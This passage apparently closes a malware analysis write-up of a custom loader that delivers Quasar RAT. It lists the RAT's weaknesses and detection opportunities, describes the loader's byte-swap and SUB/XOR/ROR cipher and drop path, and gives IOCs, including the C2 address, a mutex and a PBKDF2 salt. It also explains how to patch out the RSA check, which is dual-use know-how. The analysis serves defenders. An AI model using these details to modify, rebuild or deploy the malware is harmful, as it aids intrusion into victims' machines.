9. **Weak C2 Traffic KDF (2,048 vs 50,000 Iterations)**: The config encryption uses PBKDF2 with 50,000 iterations, but the runtime C2 traffic encryption in `Security.cs` uses only 2,048 iterations. This 24x reduction makes the C2 encryption key significantly faster to brute-force. If a defender captures network traffic and knows the key format, the weaker iteration count is the cheaper target to attack.

10. **CJK Obfuscation is Cosmetic Only**: The CJK Unicode renaming makes class names unreadable, but it does not protect the code. ILSpy and DNSpy decompile every method body to clean C# regardless of the identifier names. String literals (`"Office04"`, `"Quasar Client"`, ProtoBuf attributes, error messages) are all untouched. A `strings` command on the binary reveals the family, version, and command names in seconds.

11. **RSA Key Verification is Bypassable**: The Settings initializer verifies the encryption key's RSA signature using an embedded X509 certificate. This is supposed to prevent C2 impersonation (sinkholes). However, the verification happens in a single method that returns `bool`. Patching this method to always return `true` (a single IL byte change: `ldc.i4.1; ret`) disables the check entirely, allowing researchers to redirect the RAT to a controlled server for behavioral analysis.

12. **Predictable Persistence Path and Registry Key**: The install path (`%AppData%\SubDir\Client.exe`) and registry key name (`9c9b9b52-cc5e-4e34-98f9-d6c777b3f4c9`) are static config values, not generated at runtime. A single GPO blocking execution from `%AppData%\SubDir\` or a registry audit rule for that specific GUID provides deterministic detection for this build.

13. **No Anti-Debugging or Anti-VM in the RAT**: Unlike the loader's `Sleep(5000)` anti-sandbox trick, the Quasar RAT payload itself has zero anti-analysis capabilities. No `IsDebuggerPresent` checks, no VM detection (`cpuid`, registry checks for VMware/VirtualBox), no sandbox detection. The RAT executes identically in a malware sandbox as it does on a real victim machine, making dynamic analysis trivial.

14. **ProtoBuf Message Types are Fingerprints**: Every one of the 71 command messages uses `[ProtoContract]` and `[ProtoMember]` attributes with fixed integer field IDs. These field IDs are compiled into the binary as constants. A YARA rule matching the ProtoBuf registration pattern (the specific combination of field IDs across multiple message types) would detect any Quasar v1.4.1 build regardless of CJK obfuscation.

---

## Conclusion

This analysis demonstrates why automated unpacking tools have limits. The custom byte-level cipher in this loader uses no standard algorithm, no recognizable constants, and no key material that a generic decryptor could match. The only way to extract the payload was to read the disassembly, understand the math, and reimplement it.

The cipher itself is simple once understood: swap adjacent bytes, then transform each byte with `SUB, SUB, XOR, ROR`. Five operations. No lookup tables. No block structure. But "simple" does not mean "easy to detect." The absence of AES S-boxes, RC4 KSA patterns, or XOR key repetition means no automated crypto identification tool would flag this as encryption. It looks like random bit manipulation in the disassembly, which is exactly why Speakeasy flagged "crypto signal" but couldn't extract the payload.

The full function at `0x140001000` tells the complete story: sleep to dodge sandboxes, decrypt with a homebrew cipher, drop to `%PUBLIC%\Libraries\win_update_host.exe` (masquerading as a Windows Update component), and launch via `ShellExecuteA`. No persistence, no anti-debug, no process injection. The loader does one job and exits. Persistence belongs to the payload.

The Quasar RAT inside is well-understood, but the packaging is what matters here. The operator wrote a custom cipher for a single purpose: to deliver Quasar past static analysis tools. The C2 at `54[.]172[.]72[.]215:4443` (AWS) and the `Office04` mutex are the operational IOCs. The PBKDF2 salt (`BF EB 1E 56 FB CD 97 3B...`) is a Quasar-specific indicator that can be used to identify other payloads from the same builder.

For analysts who encounter similar custom ciphers: the approach is always the same. Find the function that references the encrypted data. Trace the algorithm instruction by instruction. Implement it in Python. Run it. Check for MZ.

The full extraction script is available in the [analysis bundle](https://github.com/taogoldi/analysis_data/tree/main/quasar_loader_apr_2026/scripts). It extracts the payload and optionally decrypts the Quasar config in a single command.

---

*Tools used: radare2 (disassembly), pefile (PE analysis), pycryptodome (AES/PBKDF2 decryption), ILSpy (Quasar decompilation), custom Python extraction script. Quasar RAT family confirmed via [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/details/win.quasar_rat) and PE version info metadata.*
